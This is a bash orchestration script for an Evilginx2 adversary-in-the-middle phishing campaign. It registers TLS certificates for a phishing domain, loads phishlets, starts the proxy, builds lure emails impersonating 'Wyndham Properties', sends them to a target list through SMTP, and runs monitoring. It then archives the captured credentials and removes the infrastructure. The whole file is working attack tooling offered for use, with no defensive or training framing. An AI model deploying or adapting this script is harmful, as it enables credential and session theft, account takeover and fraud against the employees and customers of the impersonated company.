#!/bin/bash
# automation_orchestration.sh - Tier 3 Advanced Tool
# Full campaign lifecycle automation for Evilginx2 phishing infrastructure

set -euo pipefail

# Configuration
CONFIG_FILE="config.conf"
LOG_DIR="logs/orchestration"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
DEPLOYMENT_LOG="$LOG_DIR/deploy_$TIMESTAMP.log"
CLEANUP_LOG="$LOG_DIR/cleanup_$TIMESTAMP.log"

# Initialize
init() {
    mkdir -p "$LOG_DIR"
    load_config
    validate_dependencies
    setup_logging
}

# Load configuration
load_config() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
        log_error "Config file missing: $CONFIG_FILE"
        exit 1
    fi
    source "$CONFIG_FILE"
}

# Validate system dependencies
validate_dependencies() {
    local deps=("evilginx2" "nginx" "certbot" "jq" "ufw")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            log_error "Missing dependency: $dep"
            exit 1
        fi
    done
}

# Logging functions
setup_logging() {
    exec > >(tee -a "$DEPLOYMENT_LOG") 2>&1
}

log_info() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] INFO: $1" | tee -a "$DEPLOYMENT_LOG"
}

log_error() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" | tee -a "$DEPLOYMENT_LOG"
    exit 1
}

# Infrastructure deployment
deploy_infrastructure() {
    log_info "Starting infrastructure deployment"
    
    # 1. Network hardening
    ./security_hardening.sh full
    
    # 2. SSL certificates
    deploy_ssl_certs
    
    # 3. Evilginx2 setup
    configure_evilginx
    
    # 4. Email templates
    generate_templates
    
    log_info "Infrastructure deployment complete"
}

deploy_ssl_certs() {
    log_info "Deploying SSL certificates"
    certbot certonly --standalone -d "$PHISHING_DOMAIN" --non-interactive --agree-tos \
        || log_error "SSL certificate deployment failed"
}

configure_evilginx() {
    log_info "Configuring Evilginx2"
    evilginx2 config domain "$PHISHING_DOMAIN"
    evilginx2 config ip $(hostname -I | awk '{print $1}')
    
    # Load phishlets
    for phishlet in phishlets/*.yaml; do
        evilginx2 phishlet load "$(basename "$phishlet" .yaml)" \
            || log_error "Failed to load phishlet: $phishlet"
    done
    
    evilginx2 start || log_error "Failed to start Evilginx2"
}

generate_templates() {
    log_info "Generating email templates"
    python3 generate_templates.py \
        --domain "$PHISHING_DOMAIN" \
        --company "Wyndham Properties" \
        --output-dir templates/ \
        || log_error "Template generation failed"
}

# Campaign execution
execute_campaign() {
    log_info "Starting campaign execution"
    
    # 1. Target validation
    validate_targets
    
    # 2. Email delivery
    deliver_emails
    
    # 3. Monitoring
    start_monitoring
    
    log_info "Campaign execution in progress"
}

validate_targets() {
    if [[ ! -s "targets.txt" ]]; then
        log_error "No targets specified in targets.txt"
    fi
}

deliver_emails() {
    log_info "Sending phishing emails"
    python3 send_emails.py \
        --smtp "$SMTP_SERVER" \
        --user "$SMTP_USER" \
        --pass "$SMTP_PASS" \
        --targets targets.txt \
        --template templates/primary.html \
        || log_error "Email delivery failed"
}

start_monitoring() {
    log_info "Starting monitoring services"
    ./watchdog.sh monitor &
    ./monitor_campaign.sh &
}

# Cleanup procedures
cleanup() {
    log_info "Starting cleanup procedures"
    exec > >(tee -a "$CLEANUP_LOG") 2>&1
    
    # 1. Stop services
    pkill -f "evilginx" || true
    pkill -f "watchdog.sh" || true
    
    # 2. Archive data
    archive_campaign_data
    
    # 3. Remove infrastructure
    remove_infrastructure
    
    log_info "Cleanup complete. Campaign artifacts archived to: $ARCHIVE_PATH"
}

archive_campaign_data() {
    local archive_name="wyndham_campaign_$TIMESTAMP.tar.gz"
    ARCHIVE_PATH="/var/archives/$archive_name"
    
    mkdir -p "/var/archives"
    tar -czvf "$ARCHIVE_PATH" \
        logs/ \
        captures/ \
        targets.txt \
        config.conf \
        || log_error "Failed to archive campaign data"
}

remove_infrastructure() {
    # Remove SSL certificates
    certbot delete --cert-name "$PHISHING_DOMAIN" --non-interactive \
        || log_error "Failed to remove SSL certificates"
    
    # Reset firewall
    ufw --force reset
}

# Main execution
main() {
    case "$1" in
        deploy)
            init
            deploy_infrastructure
            ;;
        execute)
            init
            execute_campaign
            ;;
        cleanup)
            init
            cleanup
            ;;
        *)
            echo "Usage: $0 {deploy|execute|cleanup}"
            exit 1
            ;;
    esac
}

main "$@"